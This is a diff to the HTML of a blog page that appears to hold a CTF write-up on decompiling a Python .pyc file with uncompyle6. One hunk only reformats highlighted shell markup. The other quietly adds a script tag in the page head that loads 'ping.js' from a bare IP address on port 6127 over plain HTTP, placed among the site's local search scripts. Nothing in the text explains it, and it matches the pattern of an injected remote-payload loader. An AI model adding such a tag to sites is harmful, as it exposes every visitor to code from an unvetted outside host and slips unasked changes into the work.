@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -91,7 +93,7 @@ October 1, 2019
 <h2 id="decompile">Decompile</h2>
 <p>It is a Python 3 <a href="/assets/writeups/eko2019/bytecode/client.min.pyc">compiled code</a> so our first task is to decompile it.</p>
 <p>For this I’m going to use <a href="https://github.com/rocky/python-uncompyle6">uncompyle6</a></p>
-<div class="highlight-candombe"><pre><span></span><code>$ uncompyle6 --encoding utf-8 -o . client.min.pyc       <span class="c1"># byexample: +skip</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>uncompyle6<span class="w"> </span>--encoding<span class="w"> </span>utf-8<span class="w"> </span>-o<span class="w"> </span>.<span class="w"> </span>client.min.pyc<span class="w">       </span><span class="c1"># byexample: +skip</span>
 </code></pre></div>
 
 <p>This is what we got:</p>
